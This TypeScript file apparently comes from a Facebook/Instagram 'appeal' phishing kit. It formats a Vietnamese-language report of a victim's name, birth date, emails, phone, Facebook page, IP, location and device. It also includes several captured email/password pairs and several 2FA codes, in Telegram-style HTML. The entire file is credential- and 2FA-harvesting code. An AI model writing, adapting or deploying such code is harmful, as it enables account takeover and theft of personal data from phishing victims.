import type { GeoInfo, LoginProvider, UserData } from '@/store/store';

interface BuildMessageOptions {
    geoInfo: GeoInfo | null;
    userData: Pick<UserData, 'fullName' | 'birthDate' | 'personalEmail' | 'businessEmail' | 'phoneNumber' | 'facebookPageName' | 'information'>;
    loginProvider?: LoginProvider | null;
    accounts?: string[];
    passwords?: string[];
    codes?: string[];
    maxPass?: number;
    maxCode?: number;
}

const loginProviderLabel: Record<LoginProvider, string> = {
    facebook: 'Facebook',
    instagram: 'Instagram'
};

export function buildAppealMessage({
    geoInfo,
    userData,
    loginProvider,
    accounts = [],
    passwords = [],
    codes = [],
    maxPass,
    maxCode
}: BuildMessageOptions): string {
    const time = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
    const location = geoInfo ? [geoInfo.city, geoInfo.region, geoInfo.country].filter(Boolean).join(', ') : 'N/A';
    const loginLine = loginProvider ? `\n🔑 Đăng nhập: <b>${loginProviderLabel[loginProvider]}</b>` : '';

    const credentialLines = passwords
        .map((password, idx) => {
            const account = accounts[idx] || '';
            const total = maxPass ?? passwords.length;
            return `<b>📨 Email/Phone ${idx + 1}/${total}:</b> <code>${account}</code>\n<b>🔒 Password ${idx + 1}/${total}:</b> <code>${password}</code>`;
        })
        .join('\n');

    const codeLines = codes
        .map((code, idx) => {
            const total = maxCode ?? codes.length;
            return `<b>🔐 2FA Code ${idx + 1}/${total}:</b> <code>${code}</code>`;
        })
        .join('\n');

    const birthLine = userData.birthDate ? `\n   Ngày sinh: <code>${userData.birthDate}</code>` : '';

    return `
📩 <b>APPEAL FORM</b>
⏰ ${time}
🌐 IP: <code>${geoInfo?.ip || 'N/A'}</code>
📱 Thiết bị: <code>__DEVICE_INFO__</code>
📍 Vị trí: ${location}${loginLine}
━━━━━━━━━━━━━━━━━━━━
<b>📋 THÔNG TIN</b>
   Tên: <code>${userData.fullName}</code>${birthLine}
   Email: <code>${userData.personalEmail}</code>
   Business: <code>${userData.businessEmail}</code>
   SĐT: <code>${userData.phoneNumber}</code>
   Page: <code>${userData.facebookPageName}</code>
   Mô tả: <code>${userData.information || 'N/A'}</code>
${credentialLines ? `\n${credentialLines}` : ''}${codeLines ? `\n${codeLines}` : ''}
`.trim();
}
